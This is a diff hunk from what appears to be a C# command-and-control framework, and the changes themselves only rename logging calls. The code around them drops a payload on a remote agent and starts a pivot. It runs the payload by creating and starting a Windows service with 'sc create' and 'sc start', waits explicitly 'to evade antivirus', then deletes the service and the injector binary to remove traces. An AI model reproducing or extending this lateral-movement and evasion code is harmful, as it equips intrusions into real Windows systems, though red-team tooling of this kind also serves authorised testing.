@@ -99,30 +99,30 @@ namespace Commander.Commands.Composite
             var fileId = await context.UploadAndDisplay(pay, fileName, "Uploading Payload");
             await context.CommModule.TaskAgentToDownloadFile(agent.Metadata.Id, fileId);
 
-            this.Echo($"[>] Downloading file {fileName} to {path}...");
+            this.Step($"Downloading file {fileName} to {path}");
             this.Dowload(fileName, fileId, path);
             this.Delay(1);
-            this.Echo($"[>] Starting pivot {endpoint}...");
+            this.Step($"Starting pivot {endpoint}");
             this.StartPivot(endpoint);
             this.Delay(1);
-            this.Echo($"[>] Creating service...");
+            this.Step($"Creating service");
             this.Shell($"sc create {context.Options.service} binPath= \"{path}\"");
-            this.Echo($"[>] Starting service...");
+            this.Step($"Starting service");
             this.Shell($"sc start {context.Options.service}");
            
             if (!context.Options.inject)
             {
-                this.Echo($"[>] Removing service...");
+                this.Step($"Removing service");
                 this.Shell($"sc delete {context.Options.service}");
                 this.Echo($"[!] Don't forget to remove service binary after use! : shell del {path}");
             }
             else
             {
-                this.Echo($"[>] Waiting {options.InjectionDelay + 10}s to evade antivirus...");
+                this.Step($"Waiting {options.InjectionDelay + 10}s to evade antivirus");
                 this.Delay(options.InjectionDelay + 10);
-                this.Echo($"[>] Removing service...");
+                this.Step($"Removing service");
                 this.Shell($"sc delete {context.Options.service}");
-                this.Echo($"[>] Removing injector {path}...");
+                this.Step($"Removing injector {path}");
                 this.Shell($"del {path}");
             }
             
